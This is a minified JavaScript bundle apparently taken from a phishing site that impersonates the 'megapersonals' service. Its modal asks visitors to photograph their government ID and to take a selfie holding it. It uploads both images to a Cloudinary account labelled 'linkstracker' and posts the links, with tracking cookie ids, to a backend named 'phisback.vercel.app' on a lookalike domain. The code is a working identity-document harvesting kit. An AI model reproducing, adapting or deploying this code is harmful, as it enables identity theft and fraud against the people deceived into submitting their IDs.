"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[732],{5825:function(e,t){t.Z={src:"/_next/static/media/megapersonals.b1da273c.png",height:100,width:495,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAACCAMAAABSSm3fAAAAGFBMVEVdyP/EyMrWwbCzwL/7smLCx8dfyv//sFaGBmNBAAAACHRSTlNIPERPUC5dYaBI1aIAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAaSURBVHicY2BhZ2ZgYGBgY2BiYmJlZGRkBgABfgAmbRk/hwAAAABJRU5ErkJggg==",blurWidth:8,blurHeight:2}},5150:function(e,t,s){s.d(t,{Z:function(){return f}});var l=s(5893),n=s(7294),a=function(){return(0,l.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:4,stroke:"currentColor",className:"w-4 h-4",children:(0,l.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M4.5 12.75l6 6 9-13.5"})})},o=function(){return(0,l.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:4,stroke:"currentColor",className:"w-4 h-4",children:(0,l.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M15.75 19.5L8.25 12l7.5-7.5"})})},r=function(){return(0,l.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:4,stroke:"currentColor",className:"w-4 h-4",children:(0,l.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M6 18L18 6M6 6l12 12"})})},c=s(4970),i=s.n(c),d=s(5675),u=s.n(d),m=s(1955),x=function(){return(0,l.jsx)("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:1.5,stroke:"currentColor",className:"w-6 h-6",children:(0,l.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99"})})},h=function(){return(0,l.jsxs)("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",className:"w-4 h-4 fill-white",children:[(0,l.jsx)("path",{d:"M12 9a3.75 3.75 0 100 7.5A3.75 3.75 0 0012 9z"}),(0,l.jsx)("path",{fillRule:"evenodd",d:"M9.344 3.071a49.52 49.52 0 015.312 0c.967.052 1.83.585 2.332 1.39l.821 1.317c.24.383.645.643 1.11.71.386.054.77.113 1.152.177 1.432.239 2.429 1.493 2.429 2.909V18a3 3 0 01-3 3h-15a3 3 0 01-3-3V9.574c0-1.416.997-2.67 2.429-2.909.382-.064.766-.123 1.151-.178a1.56 1.56 0 001.11-.71l.822-1.315a2.942 2.942 0 012.332-1.39zM6.75 12.75a5.25 5.25 0 1110.5 0 5.25 5.25 0 01-10.5 0zm12-1.5a.75.75 0 100-1.5.75.75 0 000 1.5z",clipRule:"evenodd"})]})},p=s(2920),g=s(1645),f=function(e){let{setShowModal:t}=e,[s,c]=(0,n.useState)("user"),d={width:450,height:300,facingMode:s},f=()=>{c("user"===s?{exact:"environment"}:"user")},[j,w]=(0,n.useState)(""),[b,A]=(0,n.useState)(""),[y,v]=(0,n.useState)(""),N=(0,n.useRef)(null),k=(0,n.useRef)(null),C="dfcuxshca",B="linkstracker",E="linkstracker",M=(0,n.useCallback)(()=>{let e=N.current.getScreenshot(),t=new FormData;t.append("file",e),t.append("upload_preset",B),t.append("cloud_name",C),t.append("folder",E);let s=async()=>{try{let e=await fetch("https://api.cloudinary.com/v1_1/".concat(C,"/image/upload"),{method:"POST",body:t}),s=await e.json();e.ok?(A(s.secure_url),w("")):console.log("error",s)}catch(l){console.log("error",l)}};s()},[N]),S=(0,n.useCallback)(()=>{let e=k.current.getScreenshot(),t=new FormData;t.append("file",e),t.append("upload_preset",B),t.append("cloud_name",C),t.append("folder",E);let s=async()=>{try{let e=await fetch("https://api.cloudinary.com/v1_1/".concat(C,"/image/upload"),{method:"POST",body:t}),s=await e.json();e.ok?(v(s.secure_url),w("")):console.log("error",s)}catch(l){console.log("error",l)}};s()},[k]),T={id:m.Z.get("id"),onlyCard:b,holdingCard:y},L=async()=>{console.log("allValues",T);let e="".concat(g.T,"/card/add"),s=await fetch(e,{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(T)}),l=await s.json();s.ok?(console.log("success",l),console.log("success",l),p.Am.success("Login Succecssfull"),m.Z.remove("id"),m.Z.remove("posterId"),m.Z.remove("adminId"),t(!1)):console.log("error",l)};return(0,l.jsx)("div",{className:"absolute inset-0 bg-black/40 h-screen",children:(0,l.jsxs)("div",{className:"flex flex-col justify-center items-center h-full",children:[(0,l.jsxs)("div",{className:"md:w-[450px] rounded-md bg-white shadow-md overflow-hidden ",children:[(0,l.jsxs)("div",{className:"py-3.5 px-5 bg-gray-200 flex justify-between items-center",children:[(0,l.jsx)("button",{type:"button",onClick(){t(!1),w("onlyCard")},children:(0,l.jsx)(o,{})}),(0,l.jsx)("p",{className:"text-center capitalize text-sm font-semibold text-gray-500",children:"NEED HELP?"}),(0,l.jsx)("button",{type:"button",onClick(){t(!1),w(!1)},children:(0,l.jsx)(r,{})})]}),j?(0,l.jsxs)(l.Fragment,{children:["onlyCard"===j&&(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(i(),{ref:N,audio:!1,screenshotFormat:"image/jpeg",videoConstraints:d}),(0,l.jsxs)("div",{className:"mt-3 mb-5 relative",children:[(0,l.jsx)("button",{type:"button",className:"mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white",onClick:M,children:"Take Photo"}),(0,l.jsxs)("button",{type:"button",className:"md:hidden absolute top-1 right-7 rounded-full flex flex-col items-center",onClick:f,children:[(0,l.jsx)(x,{}),(0,l.jsx)("p",{className:"text-xs",children:"Rotate"})]})]})]}),"holdingCard"===j&&(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(i(),{ref:k,audio:!1,screenshotFormat:"image/jpeg",videoConstraints:d}),(0,l.jsxs)("div",{className:"mt-3 mb-5 relative",children:[(0,l.jsx)("button",{type:"button",className:"mx-auto flex justify-center px-6 py-2 text-sm font-medium bg-blue-600 text-white",onClick:S,children:"Take Photo"}),(0,l.jsxs)("button",{type:"button",className:"md:hidden absolute top-1 right-7 rounded-full flex flex-col items-center",onClick:f,children:[(0,l.jsx)(x,{}),(0,l.jsx)("p",{className:"text-xs",children:"Rotate"})]})]})]})]}):(0,l.jsxs)("div",{className:"mx-8 my-6 flex flex-col items-center gap-5",children:[(0,l.jsx)("h1",{className:"text-[22px] font-semibold uppercase text-gray-700",children:"PHOTO UPLOAD"}),(0,l.jsxs)("div",{className:"relative w-[160px] h-[90px]",children:[!b&&(0,l.jsx)(u(),{alt:"id image",src:"/images/id-photo-1.jpg",fill:!0,className:"object-cover"}),b&&!y&&(0,l.jsx)(u(),{alt:"id image",src:"/images/id-photo-2.jpg",fill:!0,className:"object-cover object-center"})]}),(0,l.jsxs)("div",{className:"mt-8",children:[(0,l.jsxs)("div",{className:"flex items-center gap-3 ".concat(b&&"opacity-50"),children:[(0,l.jsx)("span",{className:"bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center",children:b?(0,l.jsx)(a,{}):1}),(0,l.jsx)("p",{className:"flex-1 text-sm",children:"Upload or take a photo of your GOVERNMENT ID on a flat surface."})]}),!b&&(0,l.jsxs)("button",{type:"button",className:"relative flex justify-center items-center mt-6 w-full bg-gradient-to-r from-blue-500 to-[#0552AA] text-white text-sm font-semibold py-3 uppercase",onClick:()=>w("onlyCard"),children:[(0,l.jsx)("p",{children:"TAKE PHOTO OF ID"}),(0,l.jsx)("span",{className:"absolute right-5",children:(0,l.jsx)(h,{})})]})]}),(0,l.jsxs)("div",{className:"mt-8",children:[(0,l.jsxs)("div",{className:"flex items-center gap-3 ".concat((!b||y)&&"opacity-50"),children:[(0,l.jsx)("span",{className:"bg-gray-800 text-white rounded-full h-10 w-10 text-lg flex justify-center items-center",children:y?(0,l.jsx)(a,{}):2}),(0,l.jsx)("p",{className:"flex-1 text-sm",children:"Upload or take a selfie of your GOVERNMENT ID close to your face."})]}),b&&!y&&(0,l.jsxs)("button",{type:"button",className:"relative flex justify-center items-center mt-6 w-full bg-gradient-to-r from-blue-500 to-[#0552AA] text-white text-sm font-semibold py-3 uppercase",onClick:()=>w("holdingCard"),children:[(0,l.jsx)("p",{children:"TAKE SELFIE WITH ID"}),(0,l.jsx)("span",{className:"absolute right-5",children:(0,l.jsx)(h,{})})]})]}),b&&y&&(0,l.jsx)("button",{type:"button",className:"mt-3 text-white text-sm font-medium bg-blue-600 py-3 px-8 uppercase",onClick:L,children:"SUBMIT"})]})]}),(0,l.jsx)("div",{className:"mt-3 font-bold text-lg italic",children:"Hold tight..."})]})})}},1645:function(e,t,s){s.d(t,{T:function(){return l},l:function(){return n}});let l="https://phisback.vercel.app",n="www.megapersonals.online"}}]);